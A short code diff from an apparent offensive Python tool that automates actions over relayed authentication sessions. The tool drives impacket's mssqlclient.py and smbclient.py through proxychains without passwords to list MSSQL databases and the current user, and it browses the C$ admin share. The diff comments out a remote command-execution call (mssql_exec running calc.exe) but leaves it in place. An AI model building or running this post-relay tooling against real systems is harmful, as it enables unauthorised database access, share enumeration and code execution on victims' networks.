@@ -121,8 +121,8 @@ def list_databases(relay_user, relay_host, relay_port):
     # I would prefer to import the impacket libraries and interact directly, but I think I'm just going to subprocess/popen it...
     # BAD EXAMPLE WILL UPDATE LATER >:D : echo "shares\nuse C$\nls\nexit\n" | proxychains smbclient.py -no-pass DOMAIN/USERNAME@1.2.3.4
     connection_string = relay_user + "@" + relay_host
-    input = 'SELECT name FROM master.sys.databases;\n'
-    print("Attempting to list MSSQL databases as '%s'." % (connection_string))
+    input = 'SELECT CURRENT_USER;\nSELECT name FROM master.sys.databases;\nexit\n'
+    print("Attempting to list current db user and MSSQL databases as '%s'." % (connection_string))
     try:
         proc = run(['proxychains', 'mssqlclient.py', '-windows-auth', '-no-pass', '-port', relay_port, connection_string ], stdout=PIPE,
             input=input, encoding='ascii')
@@ -154,9 +154,9 @@ def handle_relay_info(relay_info):
             list_shares(relay_user, relay_host, relay_port, is_admin)
         if protocol == 'MSSQL':
             list_databases(relay_user, relay_host, relay_port)
-            method = 1      # Methods are 1,2,3 in order of safest to dirtiest.
-            command = 'calc.exe'
-            mssql_exec(relay_user, relay_host, relay_port, method, command)
+            #method = 1      # Methods are 1,2,3 in order of safest to dirtiest.
+            #command = 'calc.exe'
+            #mssql_exec(relay_user, relay_host, relay_port, method, command)
         if protocol == 'IMAP':
             # TODO: do some magic. I've never played with this one, and will need some time with it.
             # dump_emails()
